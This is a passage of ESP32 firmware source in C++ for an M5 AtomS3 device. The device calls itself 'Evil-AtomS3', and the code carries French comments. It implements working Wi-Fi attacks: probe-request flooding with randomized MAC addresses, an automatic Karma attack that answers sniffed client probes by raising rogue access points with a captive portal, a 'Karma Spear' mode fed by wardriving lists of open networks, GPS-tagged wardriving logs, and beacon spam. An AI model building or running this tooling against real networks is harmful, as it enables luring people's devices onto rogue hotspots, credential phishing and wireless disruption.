    sscanf(mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &macArray[0], &macArray[1], &macArray[2], &macArray[3], &macArray[4], &macArray[5]);
    esp_wifi_set_mac(WIFI_IF_STA, macArray);
    delay(50);
}



std::vector<String> readCustomProbes(const char* filename) {
    File file = SD.open(filename, FILE_READ);
    std::vector<String> customProbes;

    if (!file) {
        Serial.println("Failed to open file for reading");
        return customProbes;
    }

    while (file.available()) {
        String line = file.readStringUntil('\n');
        if (line.startsWith("CustomProbes=")) {
            String probesStr = line.substring(String("CustomProbes=").length());
            int idx = 0;
            while ((idx = probesStr.indexOf(',')) != -1) {
                customProbes.push_back(probesStr.substring(0, idx));
                probesStr = probesStr.substring(idx + 1);
            }
            if (probesStr.length() > 0) {
                customProbes.push_back(probesStr);
            }
            break;
        }
    }
    file.close();
    return customProbes;
}



int checkNb = 0;
bool useCustomProbes;
std::vector<String> customProbes;

void probeAttack() {
    WiFi.mode(WIFI_MODE_STA);
    isProbeAttackRunning = true;
    useCustomProbes = false;

    if (!isItSerialCommand){
        useCustomProbes = confirmPopup("Use custom probes?");
        M5.Display.clear();
        if (useCustomProbes) {
            customProbes = readCustomProbes("/config/config.txt");
        } else {
            customProbes.clear(); 
        }
    } else {
        M5.Display.clear();
        isItSerialCommand = false;
        customProbes.clear();
    }
    int probeCount = 0;
    int delayTime = 500; // initial probes delay
    unsigned long previousMillis = 0;
    const int debounceDelay = 200; 
    unsigned long lastDebounceTime = 0;
    
    M5.Display.fillRect(0, M5.Display.height() - 30, M5.Display.width(), 30, TFT_RED);
    M5.Display.setCursor(50, M5.Display.height() - 20);
    M5.Display.println("Stop");
    M5.Display.setTextColor(TFT_WHITE);
    
    int probesTextX = 0;
    String probesText = "Probe Attack running.";
    M5.Display.setCursor(probesTextX, 50);
    M5.Display.println(probesText);
    probesText = "Probes sent: ";
    M5.Display.setCursor(probesTextX, 70);
    M5.Display.print(probesText);
    Serial.println("-------------------");
    Serial.println("Starting Probe Attack");
    Serial.println("-------------------");
    
    while (isProbeAttackRunning) {
        unsigned long currentMillis = millis();
        handleDnsRequestSerial();
        if (currentMillis - previousMillis >= delayTime) {
            previousMillis = currentMillis;
            setRandomMAC_STA();
            setNextWiFiChannel();
            String ssid;
            if (!customProbes.empty()) {
                ssid = customProbes[probeCount % customProbes.size()];
            } else {
                ssid = generateRandomSSID(32);
            }
            if (ledOn){
                pixels.setPixelColor(0, pixels.Color(255,0,0)); 
                pixels.setPixelColor(9, pixels.Color(255,0,0)); 
                pixels.show(); 
                delay(50); 
            
                pixels.setPixelColor(0, pixels.Color(0,0,0)); 
                pixels.setPixelColor(9, pixels.Color(0,0,0)); 
                pixels.show(); 
            }
            WiFi.begin(ssid.c_str(), "");

          M5.Display.setCursor(probesTextX + 12, 80);
          M5.Display.fillRect(probesTextX +  12, 80, 40, 10, TFT_BLACK);
          M5.Display.print(++probeCount);

          M5.Display.fillRect(100, M5.Display.height() / 2, 140, 20, TFT_BLACK);

          M5.Display.setCursor(100, M5.Display.height() / 2);
         // M5.Display.print("Delay: " + String(delayTime) + "ms");

            Serial.println("Probe sent: " + ssid);
      }

      M5.update();
      if (M5.BtnA.wasPressed() && currentMillis - lastDebounceTime > debounceDelay) {
          isProbeAttackRunning = false;
      }

  }
  Serial.println("-------------------");
  Serial.println("Stopping Probe Attack");
  Serial.println("-------------------");
  restoreOriginalWiFiSettings();
  useCustomProbes = false;
  inMenu = true;
  drawMenu(); 
}

int currentChannel = 1;
int originalChannel = 1;

void setNextWiFiChannel() {
  currentChannel++;
  if (currentChannel > 14) {
      currentChannel = 1;
  }
  esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
}

void restoreOriginalWiFiSettings() {
  esp_wifi_set_promiscuous(false);
  esp_wifi_stop();
  esp_wifi_set_promiscuous_rx_cb(NULL);
  esp_wifi_deinit();
  delay(300); // Petite pause pour s'assurer que tout est terminé
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg);
  esp_wifi_start();
  WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
  restoreOriginalMAC();
  WiFi.mode(WIFI_STA);
}


// probe attack end


// Auto karma 
bool isAPDeploying = false;

void startAutoKarma() {
  esp_wifi_set_promiscuous(false);
  esp_wifi_stop();
  esp_wifi_set_promiscuous_rx_cb(NULL);
  esp_wifi_deinit();
  delay(300); // Petite pause pour s'assurer que tout est terminé
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg);
  esp_wifi_start();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&autoKarmaPacketSniffer);

  isAutoKarmaActive = true;
  Serial.println("-------------------");
  Serial.println("Karma Auto Attack Started....");
  Serial.println("-------------------");

  readConfigFile("/config/config.txt");
  createCaptivePortal();
  WiFi.softAPdisconnect(true);
  loopAutoKarma();
  esp_wifi_set_promiscuous(false);
}


void autoKarmaPacketSniffer(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_MGMT || isAPDeploying) return;

  const wifi_promiscuous_pkt_t *packet = (wifi_promiscuous_pkt_t*)buf;
  const uint8_t *frame = packet->payload;
  const uint8_t frame_type = frame[0];

  if (frame_type == 0x40) {
      uint8_t ssid_length_Karma_Auto = frame[25];
      if (ssid_length_Karma_Auto >= 1 && ssid_length_Karma_Auto <= 32) {
          char tempSSID[33];
          memset(tempSSID, 0, sizeof(tempSSID));
          for (int i = 0; i < ssid_length_Karma_Auto; i++) {
              tempSSID[i] = (char)frame[26 + i];
          }
          tempSSID[ssid_length_Karma_Auto] = '\0';
          memset(lastSSID, 0, sizeof(lastSSID)); 
          strncpy(lastSSID, tempSSID, sizeof(lastSSID) - 1);
          newSSIDAvailable = true;
      }
  }
}



bool readConfigFile(const char* filename) {
    whitelist.clear();
    File configFile = SD.open(filename);
    if (!configFile) {
        Serial.println("Failed to open config file");
        return false;
    }

    while (configFile.available()) {
        String line = configFile.readStringUntil('\n');
        if (line.startsWith("KarmaAutoWhitelist=")) {
            int startIndex = line.indexOf('=') + 1;
            String ssidList = line.substring(startIndex);
            if (!ssidList.length()) {
                break;
            }
            int lastIndex = 0, nextIndex;
            while ((nextIndex = ssidList.indexOf(',', lastIndex)) != -1) {
                whitelist.push_back(ssidList.substring(lastIndex, nextIndex).c_str());
                lastIndex = nextIndex + 1;
            }
            whitelist.push_back(ssidList.substring(lastIndex).c_str()); 
        }
    }
    configFile.close();
    return true;
}

bool isSSIDWhitelisted(const char* ssid) {
    for (const auto& wssid : whitelist) {
        if (wssid == ssid) {
            return true;
        }
    }
    return false;
}


uint8_t originalMACKarma[6];

void saveOriginalMACKarma() {
  esp_wifi_get_mac(WIFI_IF_AP, originalMACKarma);
}

void restoreOriginalMACKarma() {
  esp_wifi_set_mac(WIFI_IF_AP, originalMACKarma);
}

String generateRandomMACKarma() {
    uint8_t mac[6];
    for (int i = 0; i < 6; ++i) {
        mac[i] = random(0x00, 0xFF);
    }
    // Force unicast byte
    mac[0] &= 0xFE; 

    char macStr[18];
    snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    return String(macStr);
}

void setRandomMAC_APKarma() {

    esp_wifi_stop();

    wifi_mode_t currentMode;
    esp_wifi_get_mode(&currentMode);
    if (currentMode != WIFI_MODE_AP && currentMode != WIFI_MODE_APSTA) {
        esp_wifi_set_mode(WIFI_MODE_AP);
    }
    
    String macKarma = generateRandomMACKarma();
    uint8_t macArrayKarma[6];
    sscanf(macKarma.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &macArrayKarma[0], &macArrayKarma[1], &macArrayKarma[2], &macArrayKarma[3], &macArrayKarma[4], &macArrayKarma[5]);

    esp_err_t ret = esp_wifi_set_mac(WIFI_IF_AP, macArrayKarma);
    if (ret != ESP_OK) {
        Serial.print("Error setting MAC: ");
        Serial.println(ret);
        esp_wifi_set_mode(currentMode);
        return;
    } 

    ret = esp_wifi_start();
    if (ret != ESP_OK) {
        Serial.print("Error starting WiFi: ");
        Serial.println(ret);
        esp_wifi_set_mode(currentMode);
        return;
    } 
}



String getMACAddress() {
    uint8_t mac[6];
    esp_wifi_get_mac(WIFI_IF_AP, mac);
    char macStr[18];
    sprintf(macStr, "%02X:%02X:%02X:%02X:%02X:%02X", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    return String(macStr);
}


void loopAutoKarma() {
  while (isAutoKarmaActive) {
      M5.update();

      if (M5.BtnA.wasPressed()) {
          isAutoKarmaActive = false;
          isAPDeploying = false;
          isAutoKarmaActive = false;
          isInitialDisplayDone = false;
          inMenu = true;
          memset(lastSSID, 0, sizeof(lastSSID));
          memset(lastDeployedSSID, 0, sizeof(lastDeployedSSID));
          newSSIDAvailable = false;
          esp_wifi_set_promiscuous(false);
          Serial.println("-------------------");
          Serial.println("Karma Auto Attack Stopped....");
          Serial.println("-------------------");
          break;
      }
      if (newSSIDAvailable) {
          newSSIDAvailable = false;
          activateAPForAutoKarma(lastSSID); // Activate the AP
          isWaitingForProbeDisplayed = false;
    } else {
          if (!isWaitingForProbeDisplayed || (millis() - lastProbeDisplayUpdate > 1000)) {
              displayWaitingForProbe();
              Serial.println("-------------------");
              Serial.println("Waiting for probe....");
              Serial.println("-------------------");
              isWaitingForProbeDisplayed = true;
          }
      }

      delay(100);
  }

  memset(lastSSID, 0, sizeof(lastSSID));
  newSSIDAvailable = false;
  isWaitingForProbeDisplayed = false;
  isInitialDisplayDone = false;
  inMenu = true;
  drawMenu();
}

void activateAPForAutoKarma(const char* ssid) {
   if (isSSIDWhitelisted(ssid)) {
        Serial.println("-------------------");
        Serial.println("SSID in the whitelist, skipping : " + String(ssid));
        Serial.println("-------------------");
        return;
    }
  if (strcmp(ssid, lastDeployedSSID) == 0) {
      Serial.println("-------------------");
      Serial.println("Skipping already deployed probe : " + String(lastDeployedSSID));
      Serial.println("-------------------");
      return; 
  }

  isAPDeploying = true;
  isInitialDisplayDone = false;
  if (captivePortalPassword == ""){
     WiFi.softAP(ssid);
  }else{
     WiFi.softAP(ssid ,captivePortalPassword.c_str());
  }
  DNSServer dnsServer;
  WebServer server(80);

  Serial.println("-------------------");
  Serial.println("Starting Karma AP for : " + String(ssid));
  Serial.println("Time :" + String(autoKarmaAPDuration / 1000) + " s" );
  Serial.println("-------------------");
  unsigned long startTime = millis();

  while (millis() - startTime < autoKarmaAPDuration) {
      displayAPStatus(ssid, startTime, autoKarmaAPDuration);
      dnsServer.processNextRequest();
      server.handleClient();

      M5.update();

      if (M5.BtnA.wasPressed()) {
          memset(lastDeployedSSID, 0, sizeof(lastDeployedSSID));
          break;
      }

      int clientCount = WiFi.softAPgetStationNum();
      if (clientCount > 0) {
          clonedSSID = String(ssid);
          isAPDeploying = false;
          isAutoKarmaActive = false;
          isInitialDisplayDone = false;
          Serial.println("-------------------");
          Serial.println("Karma Successful for : " + String(clonedSSID));
          Serial.println("-------------------");
          memset(lastSSID, 0, sizeof(lastSSID));
          newSSIDAvailable = false;
          M5.Display.clear();
          M5.Display.setCursor(0 , 32);
          M5.Display.println("Karma Successfull !!!");
          M5.Display.setCursor(0 , 48);
          M5.Display.println("On : " + clonedSSID);
          delay(7000);
          WiFi.softAPdisconnect(true);
          return;
      }

      delay(100);
  }
  strncpy(lastDeployedSSID, ssid, sizeof(lastDeployedSSID) - 1);
  
  WiFi.softAPdisconnect(true);
  isAPDeploying = false;
  isWaitingForProbeDisplayed = false;

  newSSIDAvailable = false;
  isInitialDisplayDone = false;
  Serial.println("-------------------");
  Serial.println("Karma Fail for : " + String(ssid));
  Serial.println("-------------------");
}


void displayWaitingForProbe() {
  M5.Display.setCursor(0, 0);
  if (!isWaitingForProbeDisplayed) {
      M5.Display.clear();
      M5.Display.setTextSize(0);
      M5.Display.setTextColor(TFT_WHITE);
      M5.Display.fillRect(0, M5.Display.height() - 30, M5.Display.width(), 60, TFT_RED);
      M5.Display.setCursor(40, M5.Display.height() - 20);
      M5.Display.println("Stop Auto");
      M5.Display.setCursor(0, M5.Display.height() / 2 - 20);
      M5.Display.print("Waiting for probe");

      isWaitingForProbeDisplayed = true;
  }

unsigned long currentTime = millis();
  if (currentTime - lastProbeDisplayUpdate > 1000) {
      lastProbeDisplayUpdate = currentTime;
      probeDisplayState = (probeDisplayState + 1) % 4;

      // Calculer la position X pour l'animation des points
      int textWidth = M5.Display.textWidth("Waiting for probe ");
      int x = textWidth;
      int y = M5.Display.height() / 2 - 20;

      // Effacer la zone derrière les points
      M5.Display.fillRect(x, y, M5.Display.textWidth("..."), M5.Display.fontHeight(), TFT_BLACK);
      
      M5.Display.setCursor(x, y);
      for (int i = 0; i < probeDisplayState; i++) {
          M5.Display.print(".");
      }
  }
}

void displayAPStatus(const char* ssid, unsigned long startTime, int autoKarmaAPDuration) {
  unsigned long currentTime = millis();
  int remainingTime = autoKarmaAPDuration / 1000 - ((currentTime - startTime) / 1000);
  int clientCount = WiFi.softAPgetStationNum();
  M5.Display.setTextSize(0);
  M5.Display.setCursor(0, 0);
  if (!isInitialDisplayDone) {
      M5.Display.clear();
      M5.Display.setTextColor(TFT_WHITE);

      M5.Display.setCursor(0, 10); 
      M5.Display.println(String(ssid));
      
      M5.Display.setCursor(0, 30);
      M5.Display.print("Left Time: ");
      M5.Display.setCursor(0, 50);
      M5.Display.print("Connected Client: ");
      // Affichage du bouton Stop
      M5.Display.setCursor(50, M5.Display.height() - 10);
      M5.Display.println("Stop");
      
      isInitialDisplayDone = true;
  }
  int timeValuePosX = M5.Display.textWidth("Left Time: ");
  int timeValuePosY = 30;
  M5.Display.fillRect(timeValuePosX, 20 , 25, 20, TFT_BLACK);
  M5.Display.setTextColor(TFT_WHITE);
  M5.Display.setCursor(timeValuePosX, timeValuePosY);
  M5.Display.print(remainingTime);
  M5.Display.print(" s");

  int clientValuePosX = M5.Display.textWidth("Connected Client: ");
  int clientValuePosY = 50;
  M5.Display.fillRect(clientValuePosX, 40 , 25 , 20, TFT_BLACK); 
  M5.Display.setTextColor(TFT_WHITE);
  M5.Display.setCursor(clientValuePosX, clientValuePosY);
  M5.Display.print(clientCount);
}

//Auto karma end 


String createPreHeader() {
    String preHeader = "WigleWifi-1.4";
    preHeader += ",appRelease=v1.1.7"; // Remplacez [version] par la version de votre application
    preHeader += ",model=AtonS3";
    preHeader += ",release=v1.1.7"; // Remplacez [release] par la version de l'OS de l'appareil
    preHeader += ",device=Evil-AtomS3"; // Remplacez [device name] par un nom de périphérique, si souhaité
    preHeader += ",display=7h30th3r0n3"; // Ajoutez les caractéristiques d'affichage, si pertinent
    preHeader += ",board=M5AtomS3"; 
    preHeader += ",brand=M5Stack";
    return preHeader;
}

String createHeader() {
    return "MAC,SSID,AuthMode,FirstSeen,Channel,RSSI,CurrentLatitude,CurrentLongitude,AltitudeMeters,AccuracyMeters,Type";
}

int nearPrevousWifi = 0;
double lat = 0.0, lng = 0.0, alt = 0.0; // Déclaration des variables pour la latitude, la longitude et l'altitude
float accuracy = 0.0; // Déclaration de la variable pour la précision

void wardrivingMode() {
  
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    Serial.println("-------------------");
    Serial.println("Starting Wardriving");
    Serial.println("-------------------");    
    M5.Lcd.fillScreen(TFT_BLACK);
    M5.Lcd.setTextColor(TFT_WHITE, TFT_BLACK); 
    M5.Lcd.setTextSize(1.5);
    M5.Display.fillRect(0, M5.Display.height() - 30, M5.Display.width(), 30, TFT_RED);
    M5.Display.setCursor(45, M5.Display.height() - 20);
    M5.Display.setTextColor(TFT_WHITE);
    M5.Display.println("Stop");
    M5.Display.setTextColor(TFT_WHITE,TFT_BLACK);
    M5.Lcd.setCursor(0, 10);
    M5.Lcd.printf("Scanning...");
    M5.Lcd.setCursor(0, 30);
    M5.Lcd.println("No GPS Data");
    
    delay(1000);
    if (!SD.exists("/wardriving")) {
        SD.mkdir("/wardriving");
    }

    File root = SD.open("/wardriving");
    int maxIndex = 0;
    while (true) {
        File entry = root.openNextFile();
        if (!entry) break;
        String name = entry.name();
        int startIndex = name.indexOf('-') + 1;
        int endIndex = name.indexOf('.');
        if (startIndex > 0 && endIndex > startIndex) {
            int fileIndex = name.substring(startIndex, endIndex).toInt();
            if (fileIndex > maxIndex) maxIndex = fileIndex;
        }
        entry.close();
    }
    root.close();

    bool exitWardriving = false;
    bool scanStarted = false;
    while (!exitWardriving) {
        M5.update();
        handleDnsRequestSerial();

        if (!scanStarted) {
            WiFi.scanNetworks(true, true); // Start async scan
            scanStarted = true;
        }

        bool gpsDataAvailable = false;
        String gpsData;

        while (Serial2.available() > 0 && !gpsDataAvailable) {
            if (gps.encode(Serial2.read())) {
                if (gps.location.isValid() && gps.date.isValid() && gps.time.isValid()) {
                    lat = gps.location.lat();
                    lng = gps.location.lng();
                    alt = gps.altitude.meters();
                    accuracy = gps.hdop.value();
                    gpsDataAvailable = true;

                    // Affichage des informations GPS sur l'écran
                    M5.Lcd.setCursor(0, 30);
                    M5.Lcd.println("Longitude:");
                    M5.Lcd.println(String(gps.location.lng(), 6));
                    M5.Lcd.setCursor(0, 60);
                    M5.Lcd.println("Latitude:");
                    M5.Lcd.println(String(gps.location.lat(), 6));
                    M5.Lcd.setCursor(90, 60);
                    M5.Lcd.println("S:" + String(gps.satellites.value()));
                }
            }
        }

    
        int n = WiFi.scanComplete();
        if (n > -1) {
            String currentTime = formatTimeFromGPS();
            String wifiData = "\n";
            for (int i = 0; i < n; ++i) {
                // Formater les données pour chaque SSID trouvé
                String line = WiFi.BSSIDstr(i) + "," + WiFi.SSID(i) + "," + getCapabilities(WiFi.encryptionType(i)) + ",";
                line += currentTime + ",";
                line += String(WiFi.channel(i)) + ",";
                line += String(WiFi.RSSI(i)) + ",";
                line += String(lat, 6) + "," + String(lng, 6) + ",";
                line += String(alt) + "," + String(accuracy) + ",";
                line += "WIFI";
                wifiData += line + "\n";
            }
            
            Serial.println("----------------------------------------------------");
            Serial.print("WiFi Networks: " + String(n));
            Serial.print(wifiData);
            Serial.println("----------------------------------------------------");
            
            String fileName = "/wardriving/wardriving-0" + String(maxIndex + 1) + ".csv";
            
            // Ouvrir le fichier en mode lecture pour vérifier s'il existe et sa taille
            File file = SD.open(fileName, FILE_READ);
            bool isNewFile = !file || file.size() == 0;
            if (file) {
                file.close();
            }
            
            // Ouvrir le fichier en mode écriture ou append
            file = SD.open(fileName, isNewFile ? FILE_WRITE : FILE_APPEND);
            
            if (file) {
                if (isNewFile) {
                    // Écrire les en-têtes pour un nouveau fichier
                    file.println(createPreHeader());
                    file.println(createHeader());
                }
                file.print(wifiData);
                file.close();
            }

            scanStarted = false; // Reset for the next scan
                     // Mettre à jour le nombre de WiFi à proximité sur l'écran
            M5.Lcd.setCursor(0, 10);
            M5.Lcd.printf("Near WiFi: %d\n", n);
        }

        if (M5.BtnA.isPressed()) {
            exitWardriving = true;
            delay(1000);
            M5.Display.setTextSize(1);
            if (confirmPopup("List Open Networks?")) {
                M5.Lcd.fillScreen(TFT_BLACK); 
                M5.Display.setCursor(0, M5.Display.height() / 2);
                M5.Display.println("Saving Open Networks");
                M5.Display.println("  Please wait..."); 
                createKarmaList(maxIndex);
            }
            waitAndReturnToMenu("Stopping Wardriving.");
            Serial.println("-------------------");
            Serial.println("Stopping Wardriving");
            Serial.println("-------------------");  
        }
    }

    Serial.println("-------------------");
    Serial.println("Session Saved.");
    Serial.println("-------------------");  
}


String getCapabilities(wifi_auth_mode_t encryptionType) {
    switch (encryptionType) {
        case WIFI_AUTH_OPEN: return "[OPEN][ESS]";
        case WIFI_AUTH_WEP: return "[WEP][ESS]";
        case WIFI_AUTH_WPA_PSK: return "[WPA-PSK][ESS]";
        case WIFI_AUTH_WPA2_PSK: return "[WPA2-PSK][ESS]";
        case WIFI_AUTH_WPA_WPA2_PSK: return "[WPA-WPA2-PSK][ESS]";
        case WIFI_AUTH_WPA2_ENTERPRISE: return "[WPA2-ENTERPRISE][ESS]";
        default: return "[UNKNOWN]";
    }
}

String formatTimeFromGPS() {
    if (gps.time.isValid() && gps.date.isValid()) {
        char dateTime[30];
        sprintf(dateTime, "%04d-%02d-%02d %02d:%02d:%02d", gps.date.year(), gps.date.month(), gps.date.day(),
                                                         gps.time.hour(), gps.time.minute(), gps.time.second());
        return String(dateTime);
    } else {
        return "0000-00-00 00:00:00";
    }
}


void createKarmaList(int maxIndex) {
    
    std::set<std::string> uniqueSSIDs;
    // Lire le contenu existant de KarmaList.txt et l'ajouter au set
    File karmaListRead = SD.open("/KarmaList.txt", FILE_READ);
    if (karmaListRead) {
        while (karmaListRead.available()) {
            String ssid = karmaListRead.readStringUntil('\n');
            ssid.trim();
            if (ssid.length() > 0) {
                uniqueSSIDs.insert(ssid.c_str());
            }
        }
        karmaListRead.close();
    }

    File file = SD.open("/wardriving/wardriving-0" + String(maxIndex + 1) + ".csv", FILE_READ);
if (!file) {
    Serial.println("Error opening scan file");
    return;
} else {
    Serial.println("Scan file opened successfully");
}

while (file.available()) {
    String line = file.readStringUntil('\n');
    if (isNetworkOpen(line)) {
        String ssid = extractSSID(line);
        uniqueSSIDs.insert(ssid.c_str());
    }
}
    file.close();

    // Écrire le set dans KarmaList.txt
    File karmaListWrite = SD.open("/KarmaList.txt", FILE_WRITE);
if (!karmaListWrite) {
    Serial.println("Error opening KarmaList.txt for writing");
    return;
} else {
    Serial.println("KarmaList.txt opened for writing");
}

Serial.println("Writing to KarmaList.txt");
for (const auto& ssid : uniqueSSIDs) {
    karmaListWrite.println(ssid.c_str());
    Serial.println("Writing SSID: " + String(ssid.c_str()));
}
}

bool isNetworkOpen(const String& line) {
    int securityTypeStart = nthIndexOf(line, ',', 1) + 1;
    int securityTypeEnd = nthIndexOf(line, ',', 2);
    String securityType = line.substring(securityTypeStart, securityTypeEnd);
    return securityType.indexOf("[OPEN][ESS]") != -1;
}

String extractSSID(const String& line) {
    int ssidStart = nthIndexOf(line, ',', 0) + 1;
    int ssidEnd = nthIndexOf(line, ',', 1);
    String ssid = line.substring(ssidStart, ssidEnd);
    return ssid;
}

int nthIndexOf(const String& str, char toFind, int nth) {
    int found = 0;
    int index = -1;
    while (found <= nth && index < (int) str.length()) {
        index = str.indexOf(toFind, index + 1);
        if (index == -1) break;
        found++;
    }
    return index;
}

void karmaSpear() {
    isAutoKarmaActive = true;
    createCaptivePortal();
    File karmaListFile = SD.open("/KarmaList.txt", FILE_READ);
    if (!karmaListFile) {
        Serial.println("Error opening KarmaList.txt");
        waitAndReturnToMenu(" No KarmaFile.");
        return;
    }
    if (karmaListFile.available() == 0) {
        karmaListFile.close();
        Serial.println("KarmaFile empty.");
        waitAndReturnToMenu(" KarmaFile empty.");
        return;
    }
    while (karmaListFile.available()) {
        String ssid = karmaListFile.readStringUntil('\n');
        ssid.trim();
        
        if (ssid.length() > 0) {
            activateAPForAutoKarma(ssid.c_str());
            Serial.println("Created Karma AP for SSID: " + ssid);
            displayAPStatus(ssid.c_str(), millis(), autoKarmaAPDuration);
            if (karmaSuccess) { 
                M5.Display.clear();
                break; 
            }
            delay(200);
        }
    }
    karmaListFile.close();
    isAutoKarmaActive = false;
     Serial.println("Karma Spear Failed...");
    waitAndReturnToMenu("Karma Spear Failed...");
}


std::vector<String> readCustomBeacons(const char* filename) {
    File file = SD.open(filename, FILE_READ);
    std::vector<String> customBeacons;

    if (!file) {
        Serial.println("Failed to open file for reading");
        return customBeacons;
    }

    while (file.available()) {
        String line = file.readStringUntil('\n');
        if (line.startsWith("CustomBeacons=")) {
            String beaconsStr = line.substring(String("CustomBeacons=").length());
            int idx = 0;
            while ((idx = beaconsStr.indexOf(',')) != -1) {
                customBeacons.push_back(beaconsStr.substring(0, idx));
                beaconsStr = beaconsStr.substring(idx + 1);
            }
            if (beaconsStr.length() > 0) {
                customBeacons.push_back(beaconsStr); // Ajouter le dernier élément
            }
            break;
        }
    }
    file.close();
    return customBeacons;
}

void beaconAttack() {
    WiFi.mode(WIFI_MODE_AP);

    // Demander à l'utilisateur s'il souhaite utiliser des beacons personnalisés
    bool useCustomBeacons = confirmPopup("Use custom beacons?");
    M5.Display.clear();
    
    std::vector<String> customBeacons;
    if (useCustomBeacons) {
        customBeacons = readCustomBeacons("/config/config.txt"); // Remplacer par le chemin réel
    }

    int beaconCount = 0;
    unsigned long previousMillis = 0;
    int delayTimeBeacon = 0; // Délai entre les beacons
    const int debounceDelay = 0; 
    unsigned long lastDebounceTime = 0;
    
    M5.Display.fillRect(0, M5.Display.height() - 30, M5.Display.width(), 30, TFT_RED);
    M5.Display.setCursor(50, M5.Display.height() - 20);
    M5.Display.setTextColor(TFT_WHITE);
    M5.Display.println("Stop");

    int beaconTextX = 5;
    String beaconText = "Beacon Spam running";
    M5.Display.setCursor(beaconTextX, 18);
    M5.Display.println(beaconText);
    beaconText = "Beacon sent:" ;
    M5.Display.setCursor(beaconTextX, 27);
    M5.Display.print(beaconText);
    Serial.println("-------------------");
    Serial.println("Starting Beacon Spam");
    Serial.println("-------------------");

while (!M5.BtnA.isPressed()) {
    unsigned long currentMillis = millis();
    if (currentMillis - previousMillis >= delayTimeBeacon) {
        previousMillis = currentMillis;
        // Générer un nouveau SSID pour le beacon
        String ssid;
        if (!customBeacons.empty()) {
            ssid = customBeacons[beaconCount % customBeacons.size()]; // Utiliser un beacon personnalisé
        } else {
            ssid = generateRandomSSID(32); // Utiliser un beacon aléatoire
        }

        // Effacer la zone d'affichage précédente de l'SSID
        int x = 0; 
        int y = 45; 
        M5.Display.setTextColor(TFT_WHITE,TFT_BLACK);
        // Réécrire le nouvel SSID
        M5.Display.setCursor(x, y);
        M5.Display.print(ssid);
            M5.Display.setTextColor(TFT_WHITE);
        WiFi.softAP(ssid.c_str());
        delay(50);
        for (int channel = 1; channel <= 13; ++channel) {
            setRandomMAC_APKarma();
            esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
            delay(150);
          if (M5.BtnA.isPressed()) {
            break;
          }
        }
        delay(50);

        beaconCount++;
        }

       M5.update();
      if (M5.BtnB.isPressed() && currentMillis - lastDebounceTime > debounceDelay) {
          break;
      }
        delay(10);
    }
      Serial.println("-------------------");
      Serial.println("Stopping beacon Spam");
      Serial.println("-------------------");
      restoreOriginalWiFiSettings();
      waitAndReturnToMenu("Beacon Spam Stopped..");
}
